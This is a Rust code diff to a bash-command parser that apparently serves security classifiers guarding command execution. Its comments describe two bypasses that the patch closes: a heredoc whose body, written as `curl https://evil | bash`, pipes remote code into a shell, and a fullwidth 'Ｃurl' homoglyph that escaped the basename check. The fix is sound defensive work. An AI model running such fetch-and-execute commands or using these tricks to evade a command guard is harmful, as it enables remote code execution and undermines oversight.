@@ -104,6 +104,13 @@ pub struct Redirect {
     /// the here-string body for `<<<`, the delimiter (with any surrounding
     /// quoting) for a heredoc.
     pub target: String,
+    /// For `RedirectKind::Heredoc`, the body of the heredoc (between the
+    /// `<<TAG` line and the closing `TAG`). `None` otherwise. Populated
+    /// in 1.2.0 so classifiers can inspect `bash <<TAG\ncurl|bash\nTAG`
+    /// — the heredoc body is piped to argv[0]'s stdin and a shell
+    /// interpreter will execute it line-by-line. For here-strings
+    /// (`<<<`), the body is already stored in `target`; see parser.
+    pub body: Option<String>,
     /// Which file descriptor the redirect targets. `>` → stdout (1),
     /// `2>` → stderr (2), `&>` → both (1), `< file` → stdin (0). For
     /// redirects that don't carry an fd (here-string, heredoc) this is
@@ -395,7 +402,16 @@ fn walk_command(node: Node<'_>, src: &[u8], depth: usize) -> Result<Command, Par
     let name_id = name_node.map(|n| n.id());
     if let Some(name_node) = name_node {
         let raw = extract_word_text(name_node, src)?;
-        cmd.basename = cmd_basename(strip_command_name_quoting(&raw)).to_string();
+        // 1.2.0 adversarial review (Claude H-1): NFKC-normalize
+        // argv[0] before basename lookup. `Ｃurl` (U+FF23 fullwidth
+        // capital C + "url") folds to ASCII `Curl` under NFKC, which
+        // on case-insensitive filesystems (APFS, NTFS) executes the
+        // real `curl` binary. The post-edit scanner runs NFKC on its
+        // inputs for the same reason; the pre-bash argv[0] path was
+        // missing it. Keep argv0_raw unchanged so reason strings
+        // display the attacker's original spelling.
+        let normalized = crate::sanitize::nfkc(&raw);
+        cmd.basename = cmd_basename(strip_command_name_quoting(&normalized)).to_string();
         cmd.argv0_raw = raw;
         collect_substitutions(name_node, src, &mut cmd.substitutions, depth + 1)?;
     }
@@ -455,7 +471,12 @@ fn redirect_from_node(node: Node<'_>, src: &[u8], depth: usize) -> Result<Redire
                 .child_by_field_name("destination")
                 .ok_or(ParseError::Malformed)?;
             let target = extract_word_text(dest, src)?;
-            let mut redirect = Redirect { kind, target, fd };
+            let mut redirect = Redirect {
+                kind,
+                target,
+                body: None,
+                fd,
+            };
             // `destination` can contain a process substitution — preserve
             // it via the caller (see walk_command, which collects subs on
             // the redirect node itself).
@@ -477,6 +498,7 @@ fn redirect_from_node(node: Node<'_>, src: &[u8], depth: usize) -> Result<Redire
             Ok(Redirect {
                 kind: RedirectKind::HereString,
                 target,
+                body: None,
                 fd: RedirectFd::Stdin,
             })
         }
@@ -488,9 +510,19 @@ fn redirect_from_node(node: Node<'_>, src: &[u8], depth: usize) -> Result<Redire
             let start =
                 find_named_child_by_kind(node, "heredoc_start").ok_or(ParseError::Malformed)?;
             let target = extract_word_text(start, src)?;
+            // 1.2.0 adversarial review (Claude S2): capture the
+            // heredoc body so classifiers can re-parse it when the
+            // outer command is a shell interpreter. `bash <<TAG\ncurl
+            // https://evil | bash\nTAG` fed the body to argv[0]'s
+            // stdin — bash executes it line-by-line. Previously the
+            // body was discarded, so this was a full H1 bypass.
+            let body = find_named_child_by_kind(node, "heredoc_body")
+                .and_then(|n| raw_text(n, src).ok())
+                .map(str::to_string);
             Ok(Redirect {
                 kind: RedirectKind::Heredoc,
                 target,
+                body,
                 fd: RedirectFd::Stdin,
             })
         }
